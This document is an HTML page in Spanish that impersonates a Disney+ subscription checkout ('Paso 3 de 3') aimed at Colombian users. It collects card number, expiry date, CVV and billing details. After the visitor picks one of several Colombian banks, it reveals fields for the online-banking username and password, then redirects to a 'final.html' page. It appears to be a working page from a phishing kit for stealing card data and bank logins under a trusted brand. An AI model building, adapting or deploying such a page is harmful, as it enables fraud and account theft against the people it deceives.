<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Paso 3 | Disney+</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    background: #0f0f0f;
    font-family: 'Inter', sans-serif;
    color: #fff;
}

/* HEADER */
header {
    padding: 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

header img { height: 34px; }

header a {
    color: #bbb;
    font-size: 15px;
    text-decoration: none;
}

/* CONTENEDOR PRINCIPAL */
.main-container {
    padding: 20px;
    max-width: 600px;
    margin: auto;
}

.step { color: #9ca3af; font-size: 14px; }

h1 {
    font-size: 28px;
    margin-top: 5px;
    margin-bottom: 25px;
}

/* LABELS */
label {
    display: block;
    margin: 18px 0 6px;
    font-size: 14px;
    color: #d1d5db;
}

/* INPUTS */
input, select {
    width: 100%;
    padding: 15px;
    background: #1a1a1a;
    border: 1px solid #383838;
    border-radius: 6px;
    color: #fff;
    font-size: 15px;
    box-sizing: border-box;
}

/* TARJETA */
.input-card { position: relative; }

.card-icons {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    display: flex;
    gap: 6px;
}

.card-icons img {
    height: 26px;
    opacity: .9;
}

/* ROW FECHA / CVV */
.row-double {
    display: flex;
    gap: 15px;
}

.field-group { flex: 1; }

/* BOTÓN */
button {
    width: 100%;
    padding: 16px;
    margin-top: 25px;
    background: #fff;
    border: none;
    color: #000;
    border-radius: 30px;
    font-size: 17px;
    cursor: pointer;
    font-weight: 600;
}

/* RESPONSIVE */
@media (max-width: 480px) {
    .row-double { flex-direction: column; }
}

/* BLOQUE DE VALIDACIÓN DEL BANCO */
.bank-block {
    margin-top: 25px;
    padding: 15px;
    background: #151515;
    border-radius: 10px;
    border: 1px solid #2a2a2a;
}

.hidden { display: none; }
</style>

</head>
<body>

<header>
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
    <a href="#">Cerrar sesión</a>
</header>

<div class="main-container">

    <div class="step">PASO 3 DE 3</div>
    <h1>¡A disfrutar!</h1>

    <label>NOMBRE EN LA TARJETA</label>
    <input type="text" placeholder="Nombre del titular">

    <label>NÚMERO DE LA TARJETA</label>
    <div class="input-card">
        <input type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
        <div class="card-icons">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
        </div>
    </div>

    <div class="row-double">
        <div class="field-group">
            <label>FECHA DE VENCIMIENTO</label>
            <input type="text" placeholder="MM/AA" maxlength="5">
        </div>

        <div class="field-group">
            <label>CÓDIGO DE SEGURIDAD</label>
            <input type="text" placeholder="CVV" maxlength="4">
        </div>
    </div>

    <label>CIUDAD</label>
    <input type="text" placeholder="Ingrese su ciudad">

    <label>DEPARTAMENTO</label>
    <select>
        <option>Seleccionar…</option>
        <option>Antioquia</option>
        <option>Cundinamarca</option>
        <option>Valle del Cauca</option>
        <option>Atlántico</option>
        <option>Santander</option>
    </select>

    <label>RUT (Opcional)</label>
    <input type="text" placeholder="Opcional">

    <!-- BLOQUE BANCO -->
    <div class="bank-block">
        <label>Selecciona tu banco</label>

        <select id="bankSelect" onchange="mostrarLoginBanco()">
            <option value="">Elegir banco…</option>
            <option value="Bancolombia">Bancolombia</option>
            <option value="Nequi">Nequi</option>
            <option value="Davivienda">Davivienda</option>
            <option value="BBVA">BBVA</option>
            <option value="Bogotá">Banco de Bogotá</option>
            <option value="Popular">Banco Popular</option>
            <option value="Itau">Itaú</option>
        </select>

        <!-- CAMPOS DE USUARIO Y CLAVE -->
        <div id="bankLogin" class="hidden">
            <label>Usuario del banco</label>
            <input type="text" id="bankUser" placeholder="Usuario">

            <label>Contraseña</label>
            <input type="password" id="bankPass" placeholder="Contraseña">
        </div>
    </div>

    <button onclick="validarFinal()">INICIAR SUSCRIPCIÓN</button>

</div>

<script>
function mostrarLoginBanco() {
    const bank = document.getElementById("bankSelect").value;
    const block = document.getElementById("bankLogin");

    if (bank === "") {
        block.classList.add("hidden");
    } else {
        block.classList.remove("hidden");
    }
}

function validarFinal() {
    const bank = document.getElementById("bankSelect").value;
    const user = document.getElementById("bankUser").value;
    const pass = document.getElementById("bankPass").value;

    if (bank === "") {
        alert("Debes seleccionar un banco");
        return;
    }

    if (user === "" || pass === "") {
        alert("Debes ingresar usuario y contraseña del banco");
        return;
    }

    // Puedes guardar datos si quieres
    localStorage.setItem("banco", bank);

    alert("Validando con " + bank + "…");
    window.location.href = "final.html";
}
</script>

</body>
</html>
